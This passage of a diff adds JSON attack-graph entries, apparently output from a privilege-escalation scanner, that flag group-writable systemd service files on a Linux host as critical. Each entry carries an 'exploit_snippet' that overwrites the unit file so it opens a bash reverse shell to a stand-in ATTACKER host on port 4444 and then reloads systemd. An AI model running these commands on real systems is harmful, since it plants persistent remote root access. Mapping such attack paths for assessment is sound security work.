+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/vsftpd.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/vsftpd.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e62",
+      "source": "user:vuln-demon",
+      "target": "service:multipath-tools.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multipath-tools.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multipath-tools.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e63",
+      "source": "user:vuln-demon",
+      "target": "service:networking.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/network-online.target.wants/networking.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/network-online.target.wants/networking.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e64",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-networkd-wait-online.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/network-online.target.wants/systemd-networkd-wait-online.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/network-online.target.wants/systemd-networkd-wait-online.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e65",
+      "source": "user:vuln-demon",
+      "target": "service:vgauth.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/open-vm-tools.service.requires/vgauth.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/open-vm-tools.service.requires/vgauth.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e66",
+      "source": "user:vuln-demon",
+      "target": "service:grub-initrd-fallback.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/rescue.target.wants/grub-initrd-fallback.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/rescue.target.wants/grub-initrd-fallback.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e67",
+      "source": "user:vuln-demon",
+      "target": "service:sshd.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/sshd.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/sshd.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e68",
+      "source": "user:vuln-demon",
+      "target": "service:apparmor.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/sysinit.target.wants/apparmor.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/sysinit.target.wants/apparmor.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e69",
+      "source": "user:vuln-demon",
+      "target": "service:blk-availability.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/sysinit.target.wants/blk-availability.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/sysinit.target.wants/blk-availability.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e70",
+      "source": "user:vuln-demon",
+      "target": "service:finalrd.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/sysinit.target.wants/finalrd.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/sysinit.target.wants/finalrd.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e71",
+      "source": "user:vuln-demon",
+      "target": "service:keyboard-setup.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/sysinit.target.wants/keyboard-setup.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/sysinit.target.wants/keyboard-setup.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e72",
+      "source": "user:vuln-demon",
+      "target": "service:lvm2-monitor.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/sysinit.target.wants/lvm2-monitor.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/sysinit.target.wants/lvm2-monitor.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e73",
+      "source": "user:vuln-demon",
+      "target": "service:multipathd.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/sysinit.target.wants/multipathd.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/sysinit.target.wants/multipathd.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e74",
+      "source": "user:vuln-demon",
+      "target": "service:open-iscsi.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/sysinit.target.wants/open-iscsi.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/sysinit.target.wants/open-iscsi.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e75",
+      "source": "user:vuln-demon",
+      "target": "service:setvtrgb.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/sysinit.target.wants/setvtrgb.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/sysinit.target.wants/setvtrgb.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e76",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-pstore.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/sysinit.target.wants/systemd-pstore.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/sysinit.target.wants/systemd-pstore.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e77",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-timesyncd.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/sysinit.target.wants/systemd-timesyncd.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/sysinit.target.wants/systemd-timesyncd.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e78",
+      "source": "user:vuln-demon",
+      "target": "service:syslog.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/syslog.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/syslog.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e79",
+      "source": "user:vuln-demon",
+      "target": "service:vmtoolsd.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/vmtoolsd.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/vmtoolsd.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e80",
+      "source": "user:vuln-demon",
+      "target": "service:autovt@.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/autovt@.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/autovt@.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e81",
+      "source": "user:vuln-demon",
+      "target": "service:cryptdisks-early.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/cryptdisks-early.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/cryptdisks-early.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e82",
+      "source": "user:vuln-demon",
+      "target": "service:cryptdisks.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/cryptdisks.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/cryptdisks.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e83",
+      "source": "user:vuln-demon",
+      "target": "service:dbus-org.freedesktop.hostname1.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/dbus-org.freedesktop.hostname1.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/dbus-org.freedesktop.hostname1.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e84",
+      "source": "user:vuln-demon",
+      "target": "service:dbus-org.freedesktop.locale1.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/dbus-org.freedesktop.locale1.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/dbus-org.freedesktop.locale1.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e85",
+      "source": "user:vuln-demon",
+      "target": "service:dbus-org.freedesktop.login1.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/dbus-org.freedesktop.login1.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/dbus-org.freedesktop.login1.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e86",
+      "source": "user:vuln-demon",
+      "target": "service:dbus-org.freedesktop.timedate1.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/dbus-org.freedesktop.timedate1.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/dbus-org.freedesktop.timedate1.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e87",
+      "source": "user:vuln-demon",
+      "target": "service:getty-static.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/getty.target.wants/getty-static.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/getty.target.wants/getty-static.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e88",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-update-utmp-runlevel.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/graphical.target.wants/systemd-update-utmp-runlevel.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/graphical.target.wants/systemd-update-utmp-runlevel.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e89",
+      "source": "user:vuln-demon",
+      "target": "service:plymouth-halt.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/halt.target.wants/plymouth-halt.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/halt.target.wants/plymouth-halt.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e90",
+      "source": "user:vuln-demon",
+      "target": "service:hwclock.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/hwclock.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/hwclock.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e91",
+      "source": "user:vuln-demon",
+      "target": "service:plymouth-start.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/initrd-switch-root.target.wants/plymouth-start.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/initrd-switch-root.target.wants/plymouth-start.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e92",
+      "source": "user:vuln-demon",
+      "target": "service:plymouth-switch-root.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/initrd-switch-root.target.wants/plymouth-switch-root.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/initrd-switch-root.target.wants/plymouth-switch-root.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e93",
+      "source": "user:vuln-demon",
+      "target": "service:plymouth-kexec.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/kexec.target.wants/plymouth-kexec.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/kexec.target.wants/plymouth-kexec.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e94",
+      "source": "user:vuln-demon",
+      "target": "service:kmod.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/kmod.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/kmod.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e95",
+      "source": "user:vuln-demon",
+      "target": "service:lvm2.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/lvm2.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/lvm2.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e96",
+      "source": "user:vuln-demon",
+      "target": "service:dbus.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/multi-user.target.wants/dbus.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/multi-user.target.wants/dbus.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e97",
+      "source": "user:vuln-demon",
+      "target": "service:plymouth-quit-wait.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/multi-user.target.wants/plymouth-quit-wait.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/multi-user.target.wants/plymouth-quit-wait.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e98",
+      "source": "user:vuln-demon",
+      "target": "service:plymouth-quit.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/multi-user.target.wants/plymouth-quit.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/multi-user.target.wants/plymouth-quit.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e99",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-logind.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/multi-user.target.wants/systemd-logind.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/multi-user.target.wants/systemd-logind.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e100",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-update-utmp-runlevel.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/multi-user.target.wants/systemd-update-utmp-runlevel.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/multi-user.target.wants/systemd-update-utmp-runlevel.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e101",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-user-sessions.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/multi-user.target.wants/systemd-user-sessions.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/multi-user.target.wants/systemd-user-sessions.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e102",
+      "source": "user:vuln-demon",
+      "target": "service:multipath-tools-boot.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/multipath-tools-boot.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/multipath-tools-boot.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e103",
+      "source": "user:vuln-demon",
+      "target": "service:multipath-tools.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/multipath-tools.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/multipath-tools.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e104",
+      "source": "user:vuln-demon",
+      "target": "service:plymouth-log.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/plymouth-log.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/plymouth-log.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e105",
+      "source": "user:vuln-demon",
+      "target": "service:plymouth.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/plymouth.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/plymouth.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e106",
+      "source": "user:vuln-demon",
+      "target": "service:plymouth-poweroff.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/poweroff.target.wants/plymouth-poweroff.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/poweroff.target.wants/plymouth-poweroff.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e107",
+      "source": "user:vuln-demon",
+      "target": "service:procps.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/procps.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/procps.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e108",
+      "source": "user:vuln-demon",
+      "target": "service:rc.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/rc.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/rc.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e109",
+      "source": "user:vuln-demon",
+      "target": "service:rcS.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/rcS.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/rcS.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e110",
+      "source": "user:vuln-demon",
+      "target": "service:plymouth-reboot.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/reboot.target.wants/plymouth-reboot.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/reboot.target.wants/plymouth-reboot.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e111",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-update-utmp-runlevel.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/rescue.target.wants/systemd-update-utmp-runlevel.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/rescue.target.wants/systemd-update-utmp-runlevel.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e112",
+      "source": "user:vuln-demon",
+      "target": "service:screen-cleanup.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/screen-cleanup.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/screen-cleanup.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e113",
+      "source": "user:vuln-demon",
+      "target": "service:sudo.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/sudo.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/sudo.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e114",
+      "source": "user:vuln-demon",
+      "target": "service:kmod-static-nodes.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/sysinit.target.wants/kmod-static-nodes.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/sysinit.target.wants/kmod-static-nodes.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e115",
+      "source": "user:vuln-demon",
+      "target": "service:plymouth-read-write.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/sysinit.target.wants/plymouth-read-write.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/sysinit.target.wants/plymouth-read-write.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e116",
+      "source": "user:vuln-demon",
+      "target": "service:plymouth-start.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/sysinit.target.wants/plymouth-start.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/sysinit.target.wants/plymouth-start.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e117",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-binfmt.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/sysinit.target.wants/systemd-binfmt.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-binfmt.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e118",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-boot-system-token.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/sysinit.target.wants/systemd-boot-system-token.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-boot-system-token.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e119",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-hwdb-update.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/sysinit.target.wants/systemd-hwdb-update.service \u0026\u0026 systemctl daemon-reload",
